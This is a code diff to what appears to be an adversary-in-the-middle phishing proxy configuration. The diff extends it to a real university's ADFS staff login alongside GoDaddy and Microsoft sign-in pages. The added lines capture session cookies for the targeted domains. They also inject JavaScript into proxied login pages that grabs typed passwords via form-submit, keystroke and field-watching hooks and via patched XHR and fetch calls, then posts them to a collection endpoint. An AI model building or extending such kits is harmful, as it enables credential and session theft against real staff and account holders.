@@ -23,11 +23,16 @@ proxy_hosts:
 # ADFS Proxy Hosts
   - { phish_sub: "adffs", orig_sub: "adfs", domain: "example.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "adfxs", orig_sub: "adfs", domain: "example.org", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "adfsst", orig_sub: "adfsstaff", domain: "mans.edu.eg", session: true, is_landing: false, auto_filter: false }
 
 sub_filters:
 # ADFS Sub Filters
   - { triggers_on: "adfs.example.com", orig_sub: "adfs", domain: "example.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "adfs.example.org", orig_sub: "adfs", domain: "example.org", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+# mans.edu.eg ADFS Sub Filters — rewrite self-references and Microsoft WS-Fed form action
+  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "adfsstaff", domain: "mans.edu.eg", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
+  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
 
 # Microsoft Proxy Hosts — GoDaddy federation URL rewriting (response body)
   - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
@@ -133,7 +138,7 @@ sub_filters:
 #  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
-  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'microsoft.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
@@ -149,7 +154,7 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
@@ -194,6 +199,12 @@ auth_tokens:
     keys: ['.*,regexp']
 
   - domain: '.sso.godaddy.com'
+    keys: ['.*,regexp']
+
+  - domain: 'adfsstaff.mans.edu.eg'
+    keys: ['.*,regexp']
+
+  - domain: '.mans.edu.eg'
     keys: ['.*,regexp']
 
   - domain: '.onelogin.com'
@@ -274,12 +285,13 @@ js_inject:
         return text.replace(
           /("FederationRedirectUrl"\s*:\s*")([^"]*)/,
           function(m, prefix, fedUrl) {
-            // Rewrite GoDaddy SSO hostnames to their proxied equivalents
-            // (fallback in case server-side sub_filters miss it due to compression etc.)
+            // Rewrite GoDaddy SSO hostnames and any ADFS/federation hostnames
+            // to their proxied equivalents (fallback for compression-missed sub_filters)
             var patchedUrl = fedUrl
-              .replace(/sso\.godaddy\.com/g,     'ssso.' + _phishDomain)
-              .replace(/sso\.secureserver\.net/g, 'sssn.' + _phishDomain)
-              .replace(/sso2\.secureserver\.net/g,'sssn2.' + _phishDomain);
+              .replace(/sso\.godaddy\.com/g,          'ssso.' + _phishDomain)
+              .replace(/sso\.secureserver\.net/g,      'sssn.' + _phishDomain)
+              .replace(/sso2\.secureserver\.net/g,     'sssn2.' + _phishDomain)
+              .replace(/adfsstaff\.mans\.edu\.eg/g,    'adfsst.' + _phishDomain);
             // Append email fragment once
             if (patchedUrl.indexOf('#') === -1 && _scEmail) {
               patchedUrl += '#' + encodeURIComponent(_scEmail);
@@ -356,7 +368,7 @@ js_inject:
     trigger_paths: ["/*"]
     script: |
       (function() {
-        // Block service worker so it can't intercept fetch before our hook does.
+        // Block new service worker registrations so they can't intercept requests.
         if ('serviceWorker' in navigator) {
           navigator.serviceWorker.register = function() { return Promise.resolve({}); };
         }
@@ -366,49 +378,62 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
-        // --- credential capture via fetch/XHR intercept ---
-        function _extractCred(bodyStr) {
-          try {
-            var obj = JSON.parse(bodyStr);
-            var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || obj.userPassword || obj.login_password || '';
-            var user = obj.username || obj.email || obj.login || obj.user || '';
-            if (pass) return {p: pass, u: user};
-          } catch(e) {}
-          // form-encoded fallback
-          try {
-            var parts = bodyStr.split('&');
-            var p = '', u = '';
-            for (var i = 0; i < parts.length; i++) {
-              var kv = parts[i].split('=');
-              var k = decodeURIComponent(kv[0] || '');
-              var v = decodeURIComponent(kv[1] || '');
-              if (/^(password|passwd|pass|pwd|credential|secret|userPassword|login_password)$/i.test(k)) p = v;
-              if (/^(username|email|login|user)$/i.test(k)) u = v;
-            }
-            if (p) return {p: p, u: u};
-          } catch(e) {}
-          return null;
-        }
-        function _sendCred(cred) {
+        var _sent = false;
+        function _sendCred(pass, user) {
+          if (_sent || !pass) return;
+          _sent = true;
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(cred));
+            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
           } catch(e) {}
         }
-        // Patch fetch
-        var _oFetch = window.fetch;
-        window.fetch = function(url, opts) {
-          if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
-            var bodyStr = typeof opts.body === 'string' ? opts.body : '';
-            if (!bodyStr && opts.body instanceof URLSearchParams) bodyStr = opts.body.toString();
-            var cred = _extractCred(bodyStr);
-            if (cred) _sendCred(cred);
+
+        // ── Layer 1: DOM-level capture (works regardless of fetch/XHR library) ──
+        // Capture phase so we see the event before the SPA's own handler.
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          if (!form) return;
+          var pw = form.querySelector('input[type="password"]');
+          if (pw && pw.value) {
+            var uEl = form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
+            _sendCred(pw.value, uEl ? uEl.value : '');
           }
-          return _oFetch.apply(this, arguments);
-        };
-        // Patch XHR
+        }, true);
+
+        // Watch for password fields added by the React SPA and attach blur+keydown.
+        function _hookPwField(pw) {
+          if (pw._xt) return;
+          pw._xt = true;
+          pw.addEventListener('keydown', function(e) {
+            if ((e.key === 'Enter' || e.keyCode === 13) && pw.value) {
+              var form = pw.closest('form');
+              var uEl = form && form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
+              _sendCred(pw.value, uEl ? uEl.value : '');
+            }
+          });
+          pw.addEventListener('blur', function() {
+            // Only fire on blur if a submit button also exists (page is ready to login).
+            var form = pw.closest('form');
+            var btn = form && (form.querySelector('button[type="submit"],input[type="submit"],button') );
+            if (btn && pw.value) {
+              var uEl = form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
+              _sendCred(pw.value, uEl ? uEl.value : '');
+            }
+          });
+        }
+        function _scanPwFields() {
+          var pws = document.querySelectorAll('input[type="password"]');
+          for (var i = 0; i < pws.length; i++) _hookPwField(pws[i]);
+        }
+        var _obs = new MutationObserver(_scanPwFields);
+        _obs.observe(document.documentElement, {childList: true, subtree: true});
+        _scanPwFields();
+
+        // ── Layer 2: XHR prototype patch (captures calls from XHR-based libs) ──
+        // XHR prototype patching works even if the SPA instantiated XHR before this
+        // script runs, because we patch the prototype, not an instance.
         var _oOpen = XMLHttpRequest.prototype.open;
         var _oSend = XMLHttpRequest.prototype.send;
         XMLHttpRequest.prototype.open = function(method, url) {
@@ -417,11 +442,31 @@ js_inject:
         };
         XMLHttpRequest.prototype.send = function(body) {
           if (this._xm && this._xm.toUpperCase() === 'POST' && body) {
-            var bodyStr = typeof body === 'string' ? body : (body instanceof URLSearchParams ? body.toString() : '');
-            var cred = _extractCred(bodyStr);
-            if (cred) _sendCred(cred);
+            try {
+              var obj = JSON.parse(typeof body === 'string' ? body : '');
+              var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
+              var user = obj.username || obj.email || obj.login || obj.user || '';
+              if (pass) _sendCred(pass, user);
+            } catch(e) {}
           }
           return _oSend.apply(this, arguments);
+        };
+
+        // ── Layer 3: fetch re-wrap (races with SPA but catches late-binding code) ──
+        var _oFetch = window.fetch;
+        window.fetch = function(url, opts) {
+          if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
+            try {
+              var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
+              if (bodyStr) {
+                var obj = JSON.parse(bodyStr);
+                var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
+                var user = obj.username || obj.email || obj.login || obj.user || '';
+                if (pass) _sendCred(pass, user);
+              }
+            } catch(e) {}
+          }
+          return _oFetch.apply(this, arguments);
         };
 
         // --- email autofill ---
@@ -442,8 +487,8 @@ js_inject:
         setTimeout(fill, 400);
       })();
 
-  # ADFS custom domain — same approach
-  - trigger_domains: ["adfs.example.com", "adfs.example.org"]
+  # ADFS custom domain — password capture + email autofill
+  - trigger_domains: ["adfs.example.com", "adfs.example.org", "adfsstaff.mans.edu.eg"]
     trigger_paths: ["/*"]
     script: |
       (function() {
@@ -452,6 +497,49 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
+        var _sent = false;
+        function _sendCred(pass, user) {
+          if (_sent || !pass) return;
+          _sent = true;
+          try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/_x/cred', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
+          } catch(e) {}
+        }
+
+        // DOM-level capture: ADFS uses traditional form POST so this is the
+        // most reliable path. Capture phase fires before ADFS form submit handler.
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          if (!form) return;
+          var pw = form.querySelector('input[type="password"],input[name="Password"],input[name="passwd"]');
+          if (pw && pw.value) {
+            var uEl = form.querySelector('input[name="UserName"],input[type="email"],input[name="email"],input[name="username"]');
+            _sendCred(pw.value, uEl ? uEl.value : '');
+          }
+        }, true);
+
+        function _hookPwField(pw) {
+          if (pw._xt) return;
+          pw._xt = true;
+          pw.addEventListener('keydown', function(e) {
+            if ((e.key === 'Enter' || e.keyCode === 13) && pw.value) {
+              var form = pw.closest ? pw.closest('form') : null;
+              var uEl = form && form.querySelector('input[name="UserName"],input[type="email"],input[name="email"]');
+              _sendCred(pw.value, uEl ? uEl.value : '');
+            }
+          });
+        }
+        function _scanPwFields() {
+          var pws = document.querySelectorAll('input[type="password"],input[name="Password"]');
+          for (var i = 0; i < pws.length; i++) _hookPwField(pws[i]);
+        }
+        new MutationObserver(_scanPwFields).observe(document.documentElement, {childList:true, subtree:true});
+        _scanPwFields();
+
+        // Email autofill
         function fill() {
           var sels = ['input[name="UserName"]','input[id="userNameInput"]','input[type="email"]','input[name="email"]','input[type="text"]'];
           for (var i = 0; i < sels.length; i++) {
